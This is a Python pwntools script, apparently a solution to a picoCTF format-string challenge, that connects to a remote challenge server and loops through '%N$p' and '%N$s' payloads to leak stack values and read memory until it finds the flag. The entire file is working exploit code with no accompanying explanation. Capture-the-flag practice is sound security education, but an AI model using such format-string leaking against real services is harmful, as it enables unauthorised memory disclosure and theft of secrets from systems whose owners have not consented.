from pwn import *

exe = context.binary = ELF("./vuln")
context.log_level = "error"  # Suppress extra logs

HOST, PORT = "mercury.picoctf.net", 59616

for i in range(100):
    try:
        r = remote(HOST, PORT)
        r.sendline("1")
        r.sendline(f"%{i}$p")
        r.recvuntil(b"Buying stonks with token:\n")
        
        leaked_value = r.recvline().strip().decode()
        r.close()

        if leaked_value == "(nil)" or leaked_value == "0x0":
            continue  # Skip null values

        # Convert to integer
        try:
            addr = int(leaked_value, 16)
        except ValueError:
            print(f"Index {i}: {leaked_value} (not an address)")
            continue

        # Try reading memory at leaked address
        try:
            r = remote(HOST, PORT)
            r.sendline(f"%{i}$s")  # %s reads string from memory
            r.recvuntil(b"Here's a story - \n")
            leaked_str = r.recvline().strip().decode(errors="ignore")
            r.close()

            print(f"Index {i}: {leaked_value} -> {repr(leaked_str)}")

            # Check for "picoCTF" in leak
            if "picoCTF" in leaked_str:
                print(f"\n[+] Found flag: {leaked_str}\n")
                break  # Stop if flag is found

        except Exception:
            print(f"Index {i}: {leaked_value} (Could not read memory)")

    except Exception as e:
        print(f"Error at index {i}: {e}")
